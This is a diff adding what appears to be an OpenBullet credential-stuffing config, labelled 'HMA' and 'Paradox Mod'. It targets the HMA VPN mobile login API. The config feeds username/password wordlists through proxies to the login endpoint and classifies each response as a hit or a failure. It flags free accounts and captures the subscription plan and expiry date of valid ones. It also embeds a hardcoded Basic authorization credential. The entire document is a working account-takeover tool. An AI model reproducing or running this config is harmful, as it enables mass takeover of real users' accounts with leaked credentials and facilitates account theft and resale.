@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "HMA",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-05-19T01:07:21.0091173+02:00",
+  "AdditionalInfo": "",
+  "Author": "Itamai",
+  "Version": "1.2.6.1 [Paradox Mod]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://mobile.api.hmageo.com/clapi/v1.5/user/login" 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic bW9iaXNvbDExMTE6a1pERVk2enMzZA==" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "status\":{\"code\":257,\"msg\":\"Invalid username/password combination\"}" 
+  KEYCHAIN Success OR 
+    KEY "status\":0,\"data\":{\"user\":\"" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"plan\":\"\"" 
+
+#Plan PARSE "<SOURCE>" LR "plan\":\"" "\"" -> CAP "Plan" 
+
+#Expires PARSE "<SOURCE>" LR "\"expires\":\"" "\"" -> CAP "Expires" 
+
